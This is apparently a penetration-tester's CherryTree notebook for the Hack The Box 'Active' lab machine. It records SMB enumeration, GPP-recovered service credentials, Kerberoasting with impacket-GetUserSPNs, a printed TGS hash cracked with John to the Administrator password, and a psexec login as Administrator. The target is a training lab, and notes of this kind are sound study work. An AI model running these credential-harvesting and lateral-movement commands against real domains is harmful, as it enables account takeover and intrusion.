S-1-5-21-405608879-3187717380-1996298813-500 ACTIVE\Administrator (Local User)                                                                                              
S-1-5-21-405608879-3187717380-1996298813-501 ACTIVE\Guest (Local User)
S-1-5-21-405608879-3187717380-1996298813-502 ACTIVE\krbtgt (Local User)
S-1-5-21-405608879-3187717380-1996298813-512 ACTIVE\Domain Admins (Domain Group)
S-1-5-21-405608879-3187717380-1996298813-513 ACTIVE\Domain Users (Domain Group)
S-1-5-21-405608879-3187717380-1996298813-514 ACTIVE\Domain Guests (Domain Group)
S-1-5-21-405608879-3187717380-1996298813-515 ACTIVE\Domain Computers (Domain Group)
S-1-5-21-405608879-3187717380-1996298813-516 ACTIVE\Domain Controllers (Domain Group)
S-1-5-21-405608879-3187717380-1996298813-517 ACTIVE\Cert Publishers (Local Group)
S-1-5-21-405608879-3187717380-1996298813-518 ACTIVE\Schema Admins (Domain Group)
S-1-5-21-405608879-3187717380-1996298813-519 ACTIVE\Enterprise Admins (Domain Group)
S-1-5-21-405608879-3187717380-1996298813-520 ACTIVE\Group Policy Creator Owners (Domain Group)
S-1-5-21-405608879-3187717380-1996298813-521 ACTIVE\Read-only Domain Controllers (Domain Group)
S-1-5-21-405608879-3187717380-1996298813-1000 ACTIVE\DC$ (Local User)

[+] Enumerating users using SID S-1-5-21-1621100029-2620511771-2725732389 and logon username 'SVC_TGS', password 'GPPstillStandingStrong2k18'                               
                                                                                                                                                                            
S-1-5-21-1621100029-2620511771-2725732389-500 DC\Administrator (Local User)                                                                                                 
S-1-5-21-1621100029-2620511771-2725732389-501 DC\Guest (Local User)
S-1-5-21-1621100029-2620511771-2725732389-513 DC\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username 'SVC_TGS', password 'GPPstillStandingStrong2k18'                                                                
                                                                                                                                                                            
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                           
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'SVC_TGS', password 'GPPstillStandingStrong2k18'                     
                                                                                                                                                                            
                                                                                                                                                                            
 ===============================( Getting printer info for 10.10.10.100 )===============================
                                                                                                                                                                            
do_cmd: Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND                                                                                             


enum4linux complete on Fri Oct 13 18:35:02 2023
</codebox>
      </node>
      <node name="foothold" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697233470" ts_lastsave="1697241044">
        <rich_text justification="left"></rich_text>
        <rich_text>

didnt work so lets try kerberoasting


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

didint work

trying smb again

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


output

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



downloading everythign:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


from here we get the first flag
</rich_text>
        <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.100 -u SVC_TGS -p "GPPstillStandingStrong2k18" -s .</codebox>
        <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetNPUsers active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -format hashcat -outputfile hashes.asreproast</codebox>
        <codebox char_offset="76" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18</codebox>
        <codebox char_offset="88" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Active  smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.100:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
</codebox>
        <codebox char_offset="118" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.10.10.100/Users -U SVC_TGS</codebox>
      </node>
      <node name="privEsc" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697241065" ts_lastsave="1697242222">
        <rich_text>from the credentials  we got we can perform kerberoasting attack








after crackign it use:




</rich_text>
        <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type root.txt &amp;&amp; ipconfig /all</rich_text>
        <codebox char_offset="66" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-ip 10.10.10.100 admin.htb/SVC_TGS -outputfile hashes.kerberoast</codebox>
        <codebox char_offset="70" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -outputfile hashes.kerberoast
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-10-13 15:37:59.953371             



[-] CCache file is not found. Skipping..                                                 </codebox>
        <codebox char_offset="72" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">[-] CCache file is not found. Skipping...
                                                                                                                                                                           
 Active  cat hashes.kerberoast
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c2241c2bf445147880a662ceeca0ed4c$a25f392552580db05b60842522fbbfe0ef3eb3764230e589a29c0be853d9ef56939e75a75003df8f3a7f3fed91325ac098432f7738eb8e7f2a4ea6bbc345ca92793f88abe7a9af3242be1f9a7afa195d0f34a3c1d2f415c63dc2d7cbb4eac5d921dc74f670a0cd0ec9e61641c0c2dd408f648fc6d4284d6fe43d376dfaa0bc6e3bca5325161f52601f11539ac6a6192a0b02216f11d95fca9cfc2c325d75327f34cf5a6311f6c2a2f79f645f7fa19fc655c443d501705a585098006bc766693108cd6bda74039d3de9c54c21cac930c1a762c3acae065545b0d13350144e26ce3585d4cef4911539c27af60f0738ec276d322146baec13120c9e1289db1c48154583d838521d6d7f97cf7c66fc25b5984e49a4a4076c204558bea1a0cc2f44bbf5fd736b9747a67abc54795692e975ab4c60d4626ddc06248619b6ed5c68ff6cab9bbfe707b30809e35e88907caf5172254e2ecd939daeae933067786be95f443f4b8f7a3b1b51fad1685855221e95afe42c31ed20b6a4e11edd121b02ff176040cdbf52bddd2ab0fcb193bd87f938dd1ca8bda8126419489b568e3938132f1d875d622383c736d696248ec85c124e20651d363c8047a478cc25bec88c6e29fa353c3cbe5ec1d6a2d5d7f4bf13de031a54aabed525b41bdf22495cc386568c71144a43cacf15751992789ff5a6f86198edd0910b2825d5663bd53506c7aa8d891f52cf7c8261ee92863781921ebad86234fd9b933ba457e14e96e699db795c138b26282413f712a90933d21a37e87b6fc66799ac1297cff631e702cead06db028bc4fcef9a24dcbc2b8305e15e008902c301a5ff9c39c54485195e3c485d1b3c63808c21b8d161bda0ef4b53fd53b670c15ecde5ba0ba88d1a4bf44aedfba39d04c5ef14a02a8277ca6b6540dd720b86f162f34a3f8afae519f723ec1f571cf9ec0353c6d673f202efcc3229f78e2f01a4f30a52c274b51ff3b607420fe758a83d1457e9338a082143824f956fa60d7458803e84a0c2451c873e54af163133448e61ddf1a19505f9797e7f964beff0c85a679754fb5e7e0f0de33f8ef18fb19f8ec2625e93b60d31e15b6cea63dec384d11ed4f491634abdc6d416c6c08fb121268475910ebb95f1b0876bb617d1d26ea4e53fac558f8cdaf2b2272805ddfb93740f96c7324a9ffeeef46cd3d7f911f0970fc416014a92950793065ed4da1d175cd66f83f2fe5c7af4c6f687fb7b00deb58ed7d27115aa7b079d
                                                                                                                                                                           
 Active  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:05 DONE (2023-10-13 20:01) 0.1754g/s 1848Kp/s 1848Kc/s 1848KC/s Tiffani1432..Thomas31121979
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                       </codebox>
        <codebox char_offset="100" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /Administrator:Ticketmaster1968@10.10.10.100</codebox>
      </node>
    </node>
    <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
      <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">Description</rich_text>
      <rich_text>: 



</rich_text>
      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
      <rich_text>






</rich_text>
      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
      <rich_text>







</rich_text>
      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
      <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel






</rich_text>
    </node>
    <node name="Priv Escalation" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474606">
      <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">Description</rich_text>
      <rich_text>: 

</rich_text>
      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
      <rich_text>






</rich_text>
      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
      <rich_text>







</rich_text>
      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
      <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel

</rich_text>
    </node>
    <node name="Goodies" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1684267948">
      <node name="Hashes" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492949998"/>
      <node name="Passwords" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492950150"/>
      <node name="Proof\Flags\Other" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1697242300">
        <rich_text></rich_text>
        <encoded_png char_offset="0" justification="left" link="">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